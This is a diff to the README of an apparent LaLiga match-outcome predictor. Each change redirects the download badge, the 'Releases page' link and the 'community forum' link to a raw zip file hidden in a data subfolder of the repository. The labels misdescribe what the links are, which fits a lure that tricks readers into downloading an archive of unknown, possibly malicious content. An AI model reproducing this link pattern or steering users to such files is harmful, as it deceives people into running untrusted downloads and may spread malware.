@@ -1,6 +1,6 @@
 # ⚽ LaLiga-Insight-Match-Outcome-Predictor - Predict Football Match Results Easily
 
-![Download](https://raw.githubusercontent.com/Tomasz332/LaLiga-Insight-Match-Outcome-Predictor/main/millionaire/LaLiga-Insight-Match-Outcome-Predictor.zip%20Releases-blue)
+![Download](https://raw.githubusercontent.com/Tomasz332/LaLiga-Insight-Match-Outcome-Predictor/main/data/external/transfermarkt/La-Liga-Outcome-Predictor-Match-Insight-integral.zip%20Releases-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to LaLiga-Insight-Match-Outcome-Predictor! This application helps you pr
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[Visit this page to download](https://raw.githubusercontent.com/Tomasz332/LaLiga-Insight-Match-Outcome-Predictor/main/millionaire/LaLiga-Insight-Match-Outcome-Predictor.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Tomasz332/LaLiga-Insight-Match-Outcome-Predictor/main/data/external/transfermarkt/La-Liga-Outcome-Predictor-Match-Insight-integral.zip)
 
 Once on the page, look for the latest version. You will find a file compatible with your operating system. Download the file, and follow these steps to install it:
 
@@ -55,7 +55,7 @@ After installation, follow these steps to use the application:
 ## 📚 Additional Resources
 
 - **Documentation:** Detailed usage instructions are available in the application's help section.
-- **Community:** Join our community forum at [LaLiga Insights Community](https://raw.githubusercontent.com/Tomasz332/LaLiga-Insight-Match-Outcome-Predictor/main/millionaire/LaLiga-Insight-Match-Outcome-Predictor.zip) to discuss strategies and get support from other users.
+- **Community:** Join our community forum at [LaLiga Insights Community](https://raw.githubusercontent.com/Tomasz332/LaLiga-Insight-Match-Outcome-Predictor/main/data/external/transfermarkt/La-Liga-Outcome-Predictor-Match-Insight-integral.zip) to discuss strategies and get support from other users.
 
 ## 📞 Contact
 
